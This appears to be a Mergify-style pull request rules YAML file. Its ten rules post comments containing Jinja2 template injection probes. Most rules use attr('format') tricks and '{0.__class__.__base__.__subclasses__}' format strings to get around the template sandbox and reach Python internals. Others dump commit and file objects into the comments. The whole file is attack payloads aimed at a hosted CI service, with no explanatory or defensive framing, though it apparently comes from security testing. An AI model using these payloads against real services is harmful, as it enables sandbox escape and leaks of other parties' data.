pull_request_rules:
  - name: C1
    conditions:
      - -closed
    actions:
      comment:
        message: |
          C1=[
          {{ (author|attr("format"))("{0.__class__}", author) }}
          ]
  - name: C2
    conditions:
      - -closed
    actions:
      comment:
        message: |
          C2=[
          {{ (author|attr("format"))("A{0}B", author) }}
          ]
  - name: C3
    conditions:
      - -closed
    actions:
      comment:
        message: |
          C3=[
          {{ author.format("{0.__class__}", author) }}
          ]
  - name: C4
    conditions:
      - -closed
    actions:
      comment:
        message: |
          C4=[
          {{ (author|attr("encode")) }}
          ]
  - name: C5
    conditions:
      - -closed
    actions:
      comment:
        message: |
          C5=[
          {{ (author|attr("__class__")) }}
          ]
  - name: C6
    conditions:
      - -closed
    actions:
      comment:
        message: |
          C6=[
          {{ commits }}
          ]
  - name: C7
    conditions:
      - -closed
    actions:
      comment:
        message: |
          C7=[
          {{ commits|first }}
          ]
  - name: C8
    conditions:
      - -closed
    actions:
      comment:
        message: |
          C8=[
          {{ (author|attr("format"))("{0.__class__.__base__.__subclasses__}", author) }}
          ]
  - name: C9
    conditions:
      - -closed
    actions:
      comment:
        message: |
          C9=[
          {{ files }}
          ]
  - name: C10
    conditions:
      - -closed
    actions:
      comment:
        message: |
          C10=[
          {{ (author|attr("upper")) }}
          ]
